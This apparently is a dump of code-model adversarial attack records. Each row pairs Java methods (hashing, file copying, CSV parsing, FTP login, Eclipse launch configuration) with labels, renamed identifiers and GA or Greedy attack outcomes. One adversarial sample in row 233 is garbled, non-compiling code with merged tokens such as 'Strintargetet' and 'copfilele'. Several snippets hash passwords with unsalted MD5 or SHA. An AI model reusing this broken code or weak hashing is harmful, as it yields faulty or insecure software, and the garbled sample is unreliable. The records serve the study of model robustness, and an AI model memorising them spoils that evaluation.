            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            System.out.println(""Error:"" + e);
        }
    }
 <SPLIT>     public DataSet parse() throws SnifflibDatatypeException {
        NumberFormat numformat = NumberFormat.getInstance();
        if (this.headers.size() != this.types.size()) {
            throw new SnifflibDatatypeException(""Different number of headers ("" + this.headers.size() + "") and types("" + this.types.size() + "")."");
        }
        DataSet out = null;
        if (!this.dryrun) {
            out = new DataSet();
        }
        BufferedReader r = null;
        StreamTokenizer tokenizer = null;
        try {
            if (this.isURL) {
                if (this.url2goto == null) {
                    return (null);
                }
                DataInputStream in = null;
                try {
                    in = new DataInputStream(this.url2goto.openStream());
                    System.out.println(""READY TO READ FROM URL:"" + url2goto);
                    r = new BufferedReader(new InputStreamReader(in));
                } catch (Exception err) {
                    throw new RuntimeException(""Problem reading from URL "" + this.url2goto + ""."", err);
                }
            } else {
                if (this.file == null) {
                    throw new RuntimeException(""Data file to be parsed can not be null."");
                }
                if (!this.file.exists()) {
                    throw new RuntimeException(""The file "" + this.file + "" does not exist."");
                }
                r = new BufferedReader(new FileReader(this.file));
            }
            if (this.ignorePreHeaderLines > 0) {
                String strLine;
                int k = 0;
                while ((k < this.ignorePreHeaderLines) && ((strLine = r.readLine()) != null)) {
                    k++;
                }
            }
            tokenizer = new StreamTokenizer(r);
            tokenizer.resetSyntax();
            tokenizer.eolIsSignificant(true);
            tokenizer.parseNumbers();
            if (this.delimiter.equals(""\\t"")) {
                tokenizer.whitespaceChars('\t', '\t');
            }
            if (this.delimiter.equals("","")) {
                tokenizer.whitespaceChars(',', ',');
            }
            tokenizer.quoteChar('""');
            tokenizer.whitespaceChars(' ', ' ');
            boolean readingHeaders = true;
            boolean readingInitialValues = false;
            boolean readingData = false;
            boolean readingScientificNotation = false;
            if (this.headers.size() > 0) {
                readingHeaders = false;
                readingInitialValues = true;
            }
            if (this.types.size() > 0) {
                readingInitialValues = false;
                Class targetclass;
                for (int j = 0; j < this.types.size(); j++) {
                    targetclass = (Class) this.types.get(j);
                    try {
                        this.constructors.add(targetclass.getConstructor(String.class));
                    } catch (java.lang.NoSuchMethodException err) {
                        throw new SnifflibDatatypeException(""Could not find appropriate constructor for "" + targetclass + "". "" + err.getMessage());
                    }
                }
                readingData = true;
            }
            int currentColumn = 0;
            int currentRow = 0;
            this.rowcount = 0;
            boolean advanceField = true;
            while (true) {
                tokenizer.nextToken();
                switch(tokenizer.ttype) {
                    case StreamTokenizer.TT_WORD:
                        {
                            if (readingScientificNotation) {
                                throw new RuntimeException(""Problem reading scientific notation at row "" + currentRow + "" column "" + currentColumn + ""."");
                            }
                            advanceField = true;
                            if (readingHeaders) {
                                this.headers.add(tokenizer.sval);
                            } else {
                                if (readingInitialValues) {
                                    this.types.add(String.class);
                                }
                                if (!this.dryrun) {
                                    if (out.getColumnCount() <= currentColumn) {
                                        out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                    }
                                }
                                try {
                                    Constructor construct;
                                    if (currentColumn < this.constructors.size()) {
                                        construct = (Constructor) this.constructors.get(currentColumn);
                                    } else {
                                        Class targetclass = (Class) this.types.get(currentColumn);
                                        construct = targetclass.getConstructor(String.class);
                                        this.constructors.add(construct);
                                    }
                                    try {
                                        try {
                                            try {
                                                if (!this.dryrun) {
                                                    out.setValueAt(construct.newInstance((String) tokenizer.sval), currentRow, currentColumn);
                                                } else if (this.findingTargetValue) {
                                                    if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                        this.targetValue = construct.newInstance((String) tokenizer.sval);
                                                        r.close();
                                                        return (null);
                                                    }
                                                }
                                            } catch (java.lang.reflect.InvocationTargetException err) {
                                                throw new SnifflibDatatypeException(""Problem constructing 1"" + err.getMessage());
                                            }
                                        } catch (java.lang.IllegalAccessException err) {
                                            throw new SnifflibDatatypeException(""Problem constructing 2"" + err.getMessage());
                                        }
                                    } catch (java.lang.InstantiationException err) {
                                        throw new SnifflibDatatypeException(""Problem constructing 3"" + err.getMessage());
                                    }
                                } catch (java.lang.NoSuchMethodException err) {
                                    throw new SnifflibDatatypeException(""Problem constructing 4"" + err.getMessage());
                                }
                            }
                            break;
                        }
                    case StreamTokenizer.TT_NUMBER:
                        {
                            advanceField = true;
                            if (readingHeaders) {
                                throw new SnifflibDatatypeException(""Expecting string header at row="" + currentRow + "", column="" + currentColumn + ""."");
                            } else {
                                if (readingInitialValues) {
                                    this.types.add(Double.class);
                                }
                                if (!this.dryrun) {
                                    if (out.getColumnCount() <= currentColumn) {
                                        out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                    }
                                }
                                try {
                                    Constructor construct;
                                    if (currentColumn < this.constructors.size()) {
                                        construct = (Constructor) this.constructors.get(currentColumn);
                                    } else {
                                        Class targetclass = (Class) this.types.get(currentColumn);
                                        construct = targetclass.getConstructor(double.class);
                                        this.constructors.add(construct);
                                    }
                                    if (readingScientificNotation) {
                                        Double val = this.scientificNumber;
                                        if (!this.dryrun) {
                                            try {
                                                out.setValueAt(new Double(val.doubleValue() * tokenizer.nval), currentRow, currentColumn);
                                            } catch (Exception err) {
                                                throw new SnifflibDatatypeException(""Problem constructing "" + construct.getDeclaringClass() + ""at row "" + currentRow + "" column "" + currentColumn + ""."", err);
                                            }
                                        } else if (this.findingTargetValue) {
                                            if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                Double NVAL = new Double(tokenizer.nval);
                                                try {
                                                    this.targetValue = numformat.parse(val + ""E"" + NVAL);
                                                } catch (Exception err) {
                                                    throw new RuntimeException(""Problem parsing scientific notation at row="" + currentRow + "" col="" + currentColumn + ""."");
                                                }
                                                tokenizer.nextToken();
                                                if (tokenizer.ttype != 'e') {
                                                    r.close();
                                                    return (null);
                                                } else {
                                                    tokenizer.pushBack();
                                                }
                                            }
                                        }
                                        readingScientificNotation = false;
                                    } else {
                                        try {
                                            this.scientificNumber = new Double(tokenizer.nval);
                                            if (!this.dryrun) {
                                                out.setValueAt(this.scientificNumber, currentRow, currentColumn);
                                            } else if (this.findingTargetValue) {
                                                if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                    this.targetValue = this.scientificNumber;
                                                    r.close();
                                                    return (null);
                                                }
                                            }
                                        } catch (Exception err) {
                                            throw new SnifflibDatatypeException(""Problem constructing "" + construct.getDeclaringClass() + ""at row "" + currentRow + "" column "" + currentColumn + ""."", err);
                                        }
                                    }
                                } catch (java.lang.NoSuchMethodException err) {
                                    throw new SnifflibDatatypeException(""Problem constructing"" + err.getMessage());
                                }
                            }
                            break;
                        }
                    case StreamTokenizer.TT_EOL:
                        {
                            if (readingHeaders) {
                                readingHeaders = false;
                                readingInitialValues = true;
                            } else {
                                if (readingInitialValues) {
                                    readingInitialValues = false;
                                    readingData = true;
                                }
                            }
                            if (readingData) {
                                currentRow++;
                            }
                            break;
                        }
                    case StreamTokenizer.TT_EOF:
                        {
                            if (readingHeaders) {
                                throw new SnifflibDatatypeException(""End of file reached while reading headers."");
                            }
                            if (readingInitialValues) {
                                throw new SnifflibDatatypeException(""End of file reached while reading initial values."");
                            }
                            if (readingData) {
                                readingData = false;
                            }
                            break;
                        }
                    default:
                        {
                            if (tokenizer.ttype == '""') {
                                advanceField = true;
                                if (readingHeaders) {
                                    this.headers.add(tokenizer.sval);
                                } else {
                                    if (readingInitialValues) {
                                        this.types.add(String.class);
                                    }
                                    if (!this.dryrun) {
                                        if (out.getColumnCount() <= currentColumn) {
                                            out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                        }
                                    }
                                    try {
                                        Constructor construct;
                                        if (currentColumn < this.constructors.size()) {
                                            construct = (Constructor) this.constructors.get(currentColumn);
                                        } else {
                                            Class targetclass = (Class) this.types.get(currentColumn);
                                            construct = targetclass.getConstructor(String.class);
                                            this.constructors.add(construct);
                                        }
                                        try {
                                            try {
                                                try {
                                                    if (!this.dryrun) {
                                                        out.setValueAt(construct.newInstance((String) tokenizer.sval), currentRow, currentColumn);
                                                    } else if (this.findingTargetValue) {
                                                        if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                            this.targetValue = construct.newInstance((String) tokenizer.sval);
                                                            r.close();
                                                            return (null);
                                                        }
                                                    }
                                                } catch (java.lang.reflect.InvocationTargetException err) {
                                                    throw new SnifflibDatatypeException(""Problem constructing 1 "" + err.getMessage());
                                                }
                                            } catch (java.lang.IllegalAccessException err) {
                                                throw new SnifflibDatatypeException(""Problem constructing 2 "" + err.getMessage());
                                            }
                                        } catch (java.lang.InstantiationException err) {
                                            throw new SnifflibDatatypeException(""Problem constructing 3 "" + err.getMessage());
                                        }
                                    } catch (java.lang.NoSuchMethodException err) {
                                        throw new SnifflibDatatypeException(""Problem constructing 4"" + err.getMessage());
                                    }
                                }
                            } else if (tokenizer.ttype == 'e') {
                                Class targetclass = (Class) this.types.get(currentColumn);
                                if (Number.class.isAssignableFrom(targetclass)) {
                                    currentColumn--;
                                    readingScientificNotation = true;
                                    advanceField = false;
                                }
                            } else {
                                advanceField = false;
                            }
                            break;
                        }
                }
                if (tokenizer.ttype == StreamTokenizer.TT_EOF) {
                    break;
                }
                if (advanceField) {
                    currentColumn++;
                    if (!readingHeaders) {
                        if (currentColumn >= this.headers.size()) {
                            currentColumn = 0;
                        }
                    }
                }
            }
            if (!readingHeaders) {
                this.rowcount = currentRow;
            } else {
                this.rowcount = 0;
                readingHeaders = false;
                if (this.ignorePostHeaderLines > 0) {
                    String strLine;
                    int k = 0;
                    while ((k < this.ignorePostHeaderLines) && ((strLine = r.readLine()) != null)) {
                        k++;
                    }
                }
            }
            r.close();
        } catch (java.io.IOException err) {
            throw new SnifflibDatatypeException(err.getMessage());
        }
        if (!this.dryrun) {
            for (int j = 0; j < this.headers.size(); j++) {
                out.setColumnName(j, (String) this.headers.get(j));
            }
        }
        return (out);
    }
",267,,LABEL_0,LABEL_0,LABEL_0,-1,"getRandomGUID,secure,md5,sbValueBeforeMD5,time,rand,valueBeforeMD5,array,sb,j,b,valueAfterMD5",,,,0,,0,GA,4426,2.0700321118036906,failed,[]
232,"    private String encode(String plaintext) {
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA"");
            md.update(plaintext.getBytes(""UTF-8""));
            byte raw[] = md.digest();
            return (new BASE64Encoder()).encode(raw);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(""Error encoding: "" + e);
        } catch (UnsupportedEncodingException e) {
            throw new IllegalStateException(""Error encoding: "" + e);
        }
    }
 <SPLIT>     private String getFullScreenUrl() {
        progressDown.setIndeterminate(true);
        System.out.println(""Har: "" + ytUrl);
        String u = ytUrl;
        URLConnection conn = null;
        String line = null;
        String data = """";
        String fullUrl = """";
        try {
            URL url = new URL(u);
            conn = url.openConnection();
            conn.setDoOutput(true);
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            while ((line = rd.readLine()) != null) {
                if (line.contains(""fullscreenUrl"")) {
                    data = line.trim();
                }
            }
            rd.close();
            System.out.println(data);
            int start = 0;
            String[] lines = data.split(""&"");
            String[] tmp = null;
            String video_id = null;
            String t = null;
            String title = null;
            for (int i = 0; i < lines.length; i++) {
                if (lines[i].startsWith(""video_id="")) {
                    tmp = lines[i].split(""="");
                    video_id = tmp[1];
                }
                if (lines[i].startsWith(""t="")) {
                    tmp = lines[i].split(""="");
                    t = tmp[1];
                }
                if (lines[i].startsWith(""title="")) {
                    tmp = lines[i].split(""="");
                    title = tmp[1].substring(0, (tmp[1].length() - 2));
                }
                System.out.println(lines[i]);
            }
            System.out.println(""So we got..."");
            System.out.println(""video_id: "" + video_id);
            System.out.println(""t: "" + t);
            System.out.println(""title: "" + title);
            ytTitle = title;
            fullUrl = ""http://www.youtube.com/get_video.php?video_id="" + video_id + ""&t="" + t;
        } catch (Exception e) {
            System.err.println(""Error: "" + e.getLocalizedMessage());
        }
        progressDown.setIndeterminate(false);
        return fullUrl;
    }
",99,,LABEL_0,LABEL_0,LABEL_0,-1,"encode,plaintext,md,raw",,,,0,,0,GA,1097,0.4052931626637777,failed,[]
233,"    public static void copy(File in, File out) throws IOException {
        if (in.exists() && in != null && out != null) {
            if (!out.exists()) {
                if (in.isDirectory()) {
                    out.mkdirs();
                } else {
                    out.createNewFile();
                }
            }
            String source = in.isDirectory() ? ""directory"" : ""file"";
            String target = out.isDirectory() ? ""directory"" : ""file"";
            if (!source.equals(target)) {
                throw new IOException(""Can't duplicate "" + source + "" as "" + target);
            } else {
                if (source.equals(""directory"")) {
                    File[] files = in.listFiles();
                    for (File file : files) {
                        copy(file, new File(out, file.getName()));
                    }
                } else {
                    FileChannel inCh = new FileInputStream(in).getChannel();
                    FileChannel outCh = new FileOutputStream(out).getChannel();
                    inCh.transferTo(0, inCh.size(), outCh);
                }
            }
        }
    }
 <SPLIT>     @SuppressWarnings(""unchecked"")
    public void launch(final ILaunchConfiguration configuration, final String mode, final ILaunch launch, final IProgressMonitor monitor) throws CoreException {
        {
            Assert.notNull(configuration);
            Assert.notNull(monitor);
        }
        final String projectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PROJECT_NAME, """");
        final IProject prj = JavaCore.create(ResourcesPlugin.getWorkspace().getRoot()).getJavaProject(projectName).getProject();
        if (NexOpenProjectUtils.isNexOpenProject(prj)) {
            final IFile pom = prj.getFile(""pom.xml"");
            if (!pom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 root pom.xml available"");
            }
            ContentHandlerTemplate.handle(pom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    handleRootProfile(doc);
                }
            });
            final IFile bpom = prj.getFile(""business/pom.xml"");
            if (!bpom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 business pom.xml available"");
            }
            ContentHandlerTemplate.handle(bpom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    try {
                        handleBusinessProfile(doc, configuration, prj);
                    } catch (final CoreException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            });
            final ByteArrayOutputStream output = new ByteArrayOutputStream();
            try {
                final Properties props = new Properties();
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                props.setProperty(""hibernate.dialect"", support.getDialectClass(dialectName));
                props.setProperty(""hibernate.connection.driver_class"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_DRIVER, ""com.mysql.jdbc.Driver""));
                props.setProperty(""hibernate.connection.url"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_URL, ""jdbc:mysql://<host><:port>/<database>""));
                props.setProperty(""hibernate.connection.username"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                props.setProperty(""hibernate.connection.password"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_PASSWORD, """"));
                props.store(output, ""hibernate properties for code generation using NexOpen Tools 1.0.0"");
                final IFile props_file = prj.getFile(""business/src/test/resources/hibernate.properties"");
                if (!props_file.exists()) {
                    props_file.create(new ByteArrayInputStream(output.toByteArray()), true, monitor);
                } else {
                    props_file.setContents(new ByteArrayInputStream(output.toByteArray()), true, false, monitor);
                }
            } catch (final IOException e) {
                Logger.getLog().error(""I/O exception "", e);
                throw new RuntimeException(e);
            } finally {
                try {
                    output.flush();
                    output.close();
                } catch (IOException e) {
                }
            }
            if (NexOpenProjectUtils.is04xProject(prj)) {
                final IFile appContext = prj.getFile(""web/src/main/webapp/WEB-INF/applicationContext.xml"");
                if (!appContext.exists()) {
                    throw new IllegalStateException(""It no exists applicationContext.xml under web/src/main/webapp/WEB-INF, not a NexOpen project"");
                }
                ContentHandlerTemplate.handle(appContext, new ContentHandlerCallback() {

                    public void processHandle(final Document doc) {
                        final Element root = doc.getDocumentElement();
                        final List<Element> beans = XMLUtils.getChildElementsByTagName(root, ""bean"");
                        for (final Element bean : beans) {
                            final String id = bean.getAttribute(""id"");
                            if (""valueListAdapterResolver"".equals(id)) {
                                try {
                                    final String pkgName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PACKAGE, """");
                                    final String className = new StringBuilder(pkgName).append("".vlh.support.AnnotationValueListAdapterResolver"").toString();
                                    bean.setAttribute(""class"", className);
                                    break;
                                } catch (final CoreException e) {
                                    if (Logger.getLog().isInfoEnabled()) {
                                        Logger.getLog().info(""CoreException"", e);
                                    }
                                    throw new RuntimeException(e);
                                }
                            }
                        }
                    }
                });
            }
            {
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                if (support.isReverseEngineeringFileNeeded(dialectName)) {
                    try {
                        final IFile revengFile = prj.getFile(""business/src/test/resources/"" + support.getReversEngineeringFile(dialectName));
                        if (!revengFile.exists()) {
                            final Bundle bundle = HibernateActivator.getDefault().getBundle();
                            final Path src = new Path(""resources/"" + support.getReversEngineeringFile(dialectName));
                            final InputStream in = FileLocator.openStream(bundle, src, false);
                            final ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            IOUtils.copy(in, baos);
                            String str = baos.toString();
                            str = str.replace(""${schema}"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                            revengFile.create(new ByteArrayInputStream(str.getBytes()), true, null);
                        }
                    } catch (final IOException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            }
            final IResource resource = (IResource) prj.getAdapter(IResource.class);
            final QualifiedName qn = new QualifiedName(""org.nexopenframework.ide.eclipse.ui"", ""default.profile"");
            final String profile = resource.getPersistentProperty(qn);
            resource.setPersistentProperty(qn, ""reverse-engineering"");
            try {
                final InstallProjectAction action = new InstallProjectAction();
                action.scheduleJob(prj, monitor);
                prj.refreshLocal(2, monitor);
            } finally {
                prj.setPersistentProperty(qn, profile);
            }
        } else {
            Logger.getLog().info(""Not a NexOpen project :: "" + prj);
        }
    }
",230,"    public static void copy(File url, File x) throws IOException {
        if (url.exists() && url != null && x != null) {
            if (!x.exists()) {
                if (url.isDirectory()) {
                    x.mkdirs();
                } else {
                    x.createNewFile();
                }
            }
            String ssource= url.isDirectory() ? ""directory"" : ""file"";
            Strintargetet = x.isDirectory() ? ""directory"" : ""file"";
            if (!source.equals(target)) {
                throw new IOException(""Can't duplicate "" + source + "" as "" + target);
            } else {
                if (source.equals(""directory"")) {
                    File[] ffiles= url.listFiles();
                    for (File file : files) {
                        copfilele, new File(x, file.getName()));
                    }
                } else {
                    FileChannel iinChannel= new FileInputStream(url).getChannel();
                    FileChanneoutChCh = new FileOutputStream(x).getChannel();
                    inChannel.transferTo(0, inChannel.size(), outCh);
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.5717084407806396,1,"copy,in,out,source,target,files,file,inCh,outCh",,,,18,"copy:copy,in:url,out:x,source:source,target:target,files:files,file:file,inCh:inChannel,outCh:outCh,",6,GA,444,0.18634430567423502,ga,[]
234,"    public boolean connect() {
        boolean isConnected = false;
        try {
            try {
                this.ftpClient.connect(this.server, this.port);
            } catch (SocketException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            } catch (IOException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            }
            int reply = this.ftpClient.getReplyCode();
            if (!FTPReply.isPositiveCompletion(reply)) {
                this.disconnect();
                status = ErrorResult.CONNECTNOTCORRECT.code;
                return false;
            }
            try {
                if (this.account == null) {
                    if (!this.ftpClient.login(this.username, this.passwd)) {
                        status = ErrorResult.LOGINNOTCORRECT.code;
                        this.ftpClient.logout();
                        return false;
                    }
                } else if (!this.ftpClient.login(this.username, this.passwd, this.account)) {
                    status = ErrorResult.LOGINACCTNOTCORRECT.code;
                    this.ftpClient.logout();
                    return false;
                }
            } catch (IOException e) {
                status = ErrorResult.ERRORWHILECONNECT.code;
                try {
                    this.ftpClient.logout();
                } catch (IOException e1) {
                }
                return false;
            }
            isConnected = true;
            return true;
        } finally {
            if ((!isConnected) && this.ftpClient.isConnected()) {
                this.disconnect();
            }
        }
    }
 <SPLIT>     private String digest(String input) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[64];
        md.update(input.getBytes(""iso-8859-1""), 0, input.length());
        md5hash = md.digest();
        return this.convertToHex(md5hash);
    }
",275,,LABEL_0,LABEL_0,LABEL_0,-1,"connect,status,reply,isConnected",,,,0,,0,GA,1593,0.5787227829297383,failed,[]
235,"    private void copyResource() throws Exception {
        URL url = getResource(source);
        InputStream input;
        if (url != null) {
            input = url.openStream();
        } else if (new File(source).exists()) {
            input = new FileInputStream(source);
        } else {
            throw new Exception(""Could not load resource: "" + source);
        }
        OutputStream output = new FileOutputStream(destinationFile());
        int b;
        while ((b = input.read()) != -1) output.write(b);
        input.close();
        output.close();
    }
 <SPLIT>     public static int save(byte[] bytes, File outputFile) throws IOException {
        InputStream in = new ByteArrayInputStream(bytes);
        outputFile.getParentFile().mkdirs();
        OutputStream out = new FileOutputStream(outputFile);
        try {
            return IOUtils.copy(in, out);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
            try {
                out.close();
            } catch (IOException ioe) {
                ioe.getMessage();
            }
            try {
                in.close();
            } catch (IOException ioe) {
                ioe.getMessage();
            }
        }
    }
",123,,LABEL_1,LABEL_0,,-4,"copyResource,url,input,output,b",,,,0,,0,Greedy,1,0.0005128939946492513,,[]
236,"    public boolean gerarTutorialPage() {
        try {
            File indexDir = criarDiretorioSite();
            File cssDir = criarDiretorioCss();
            File capDir = criarDiretorioCapitulos();
            File licDir = criarDiretorioLicoes();
            File midDir = criarDiretorioMidias();
            File filesDir = criarDiretorioArquivos();
            File videosDir = new File(filesDir + ""/videos"");
            videosDir.mkdir();
            File imagensDir = new File(filesDir + ""/imagens"");
            imagensDir.mkdir();
            String local = System.getProperty(""user.dir"");
            FileChannel srcCss1 = new FileInputStream(local + ""/bin/style/layout.css"").getChannel();
            FileChannel destCss1 = new FileOutputStream(cssDir + ""/layout.css"").getChannel();
            destCss1.transferFrom(srcCss1, 0, srcCss1.size());
            srcCss1.close();
            destCss1.close();
            FileChannel srcCss2 = new FileInputStream(local + ""/bin/style/elementos.css"").getChannel();
            FileChannel destCss2 = new FileOutputStream(cssDir + ""/elementos.css"").getChannel();
            destCss2.transferFrom(srcCss2, 0, srcCss2.size());
            srcCss2.close();
            destCss2.close();
            FileChannel srcCss3 = new FileInputStream(local + ""/bin/style/estilo-cap-lic-mid.css"").getChannel();
            FileChannel destCss3 = new FileOutputStream(cssDir + ""/estilo-cap-lic-mid.css"").getChannel();
            destCss3.transferFrom(srcCss3, 0, srcCss3.size());
            srcCss3.close();
            destCss3.close();
            FileChannel srcCss4 = new FileInputStream(local + ""/bin/style/layout_ie.css"").getChannel();
            FileChannel destCss4 = new FileOutputStream(cssDir + ""/layout_ie.css"").getChannel();
            destCss4.transferFrom(srcCss4, 0, srcCss4.size());
            srcCss4.close();
            destCss4.close();
            FileChannel srcCss5 = new FileInputStream(local + ""/bin/style/elementos_ie.css"").getChannel();
            FileChannel destCss5 = new FileOutputStream(cssDir + ""/elementos_ie.css"").getChannel();
            destCss5.transferFrom(srcCss5, 0, srcCss5.size());
            srcCss5.close();
            destCss5.close();
            FileChannel srcCss6 = new FileInputStream(local + ""/bin/style/estilo-cap-lic-mid_ie.css"").getChannel();
            FileChannel destCss6 = new FileOutputStream(cssDir + ""/estilo-cap-lic-mid_ie.css"").getChannel();
            destCss6.transferFrom(srcCss6, 0, srcCss6.size());
            srcCss6.close();
            destCss6.close();
            copiarMidias(videosDir, imagensDir);
            escreverMidiasPage(midDir);
            escreverLicoesPage(licDir);
            escreverCapitulosPages(capDir);
            FileWriter indexHtml = new FileWriter(indexDir + ""/index.html"");
            indexHtml.write(escreverIndexHead() + escreverBodyHeader() + escreverIndexBodyContent() + escreverFooter());
            indexHtml.close();
            System.out.println(""Site gerado com sucesso"");
            JOptionPane.showMessageDialog(null, ""Web Site gerado com sucesso"", ""\\o/"", JOptionPane.INFORMATION_MESSAGE);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            System.err.println(""Site não gerado"");
            JOptionPane.showMessageDialog(null, ""Web Site não gerado corretamente"", ""Ops..."", JOptionPane.ERROR_MESSAGE);
            return false;
        }
    }
 <SPLIT>     public static void copyFileTo(String src, String dest) throws FileNotFoundException, IOException {
        File destFile = new File(dest);
        InputStream in = new FileInputStream(new File(src));
        OutputStream out = new FileOutputStream(destFile);
        byte buf[] = new byte[1024];
        int len;
        while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
        in.close();
        out.close();
    }
",611,,LABEL_1,LABEL_1,LABEL_1,-1,"gerarTutorialPage,indexDir,cssDir,capDir,licDir,midDir,filesDir,videosDir,imagensDir,local,srcCss1,destCss1,srcCss2,destCss2,srcCss3,destCss3,srcCss4",,,,0,,0,GA,6187,2.4627490003903705,failed,[]
237,"    public void uncaughtException(final Thread t, final Throwable e) {
        final Display display = Display.getCurrent();
        final Shell shell = new Shell(display);
        final MessageBox message = new MessageBox(shell, SWT.OK | SWT.CANCEL | SWT.ICON_ERROR);
        message.setText(""Hawkscope Error"");
        message.setMessage(e.getMessage() + ""\nSubmit Hawkscope Error Report to Issue Tracker?"");
        log.error(""Uncaught exception"", e);
        if (message.open() == SWT.OK) {
            IOUtils.copyToClipboard(Version.getBugReport(e));
            try {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry?comment="" + URLEncoder.encode(""Please paste the Hawkscope Error "" + ""Report here. It's currently copied to your "" + ""clipboard. Thank you for your support!"", Constants.ENCODING));
            } catch (final Exception e1) {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry"");
            }
        }
        shell.dispose();
    }
 <SPLIT>     public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
",182,,LABEL_1,LABEL_1,LABEL_1,-1,"uncaughtException,t,e,display,shell,message,e1",,,,0,,0,GA,1819,0.6848777810732524,failed,[]
238,"    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        if (request.getParameter(""edit"") != null) {
            try {
                User cu = (User) request.getSession().getAttribute(""currentuser"");
                UserDetails ud = cu.getUserDetails();
                String returnTo = ""editprofile.jsp"";
                if (!request.getParameter(""password"").equals("""")) {
                    String password = request.getParameter(""password"");
                    MessageDigest md = MessageDigest.getInstance(""MD5"");
                    md.update(new String(password).getBytes());
                    byte[] hash = md.digest();
                    String pass = new BigInteger(1, hash).toString(16);
                    cu.setClientPassword(pass);
                }
                ud.setFirstName(request.getParameter(""fname""));
                ud.setLastName(request.getParameter(""lname""));
                ud.setEmailAddress(request.getParameter(""email""));
                ud.setAddress(request.getParameter(""address""));
                ud.setZipcode(request.getParameter(""zipcode""));
                ud.setTown(request.getParameter(""town""));
                ud.setCountry(request.getParameter(""country""));
                ud.setTrackingColor(request.getParameter(""input1""));
                String vis = request.getParameter(""visibility"");
                if (vis.equals(""self"")) {
                    cu.setVisibility(0);
                } else if (vis.equals(""friends"")) {
                    cu.setVisibility(1);
                } else if (vis.equals(""all"")) {
                    cu.setVisibility(2);
                } else {
                    response.sendRedirect(""error.jsp?id=8"");
                }
                em.getTransaction().begin();
                em.persist(cu);
                em.getTransaction().commit();
                response.sendRedirect(returnTo);
            } catch (Throwable e) {
                e.printStackTrace();
                response.sendRedirect(""error.jsp?id=5"");
            }
            return;
        }
    }
 <SPLIT>     public void init(ConnectionManager mgr, Hashtable cfg, Socket sock) throws RemoteException {
        _cman = mgr;
        _sock = sock;
        for (int i = 0; i < 256; i++) {
            String key = Integer.toHexString(i);
            if (key.length() < 2) key = ""0"" + key;
            availcmd.push(key);
            commands.put(key, null);
        }
        try {
